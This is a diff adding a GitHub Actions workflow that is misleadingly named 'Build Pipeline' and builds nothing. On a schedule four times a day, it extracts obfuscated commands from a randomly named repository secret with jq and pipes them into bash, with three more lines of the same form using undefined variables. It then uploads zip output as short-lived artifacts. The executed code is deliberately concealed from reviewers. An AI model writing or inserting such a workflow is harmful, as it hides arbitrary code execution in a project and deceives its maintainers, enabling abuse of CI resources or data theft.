@@ -1,0 +1,29 @@
+name: Build Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '51 4,10,16,22 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  runner:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Go
+        env:
+          msvvk1733: ${{ secrets.msvvk1733 }}
+        run: |
+          printf '%s' "$msvvk1733" | jq -r .seaci71363 | /bin/bash
+          echo $ayaj6 | jq -r .p4 | /bin/bash
+          printf '%s' "$hqc38458" | jq -r .h2 | /bin/bash
+          printf '%s' "$ytc1" | jq -r .q415 | /bin/bash
+
+      - name: Archive results
+        uses: actions/upload-artifact@v4
+        with:
+          name: 68UvxiHB
+          path: "*.zip"
+          retention-days: 1
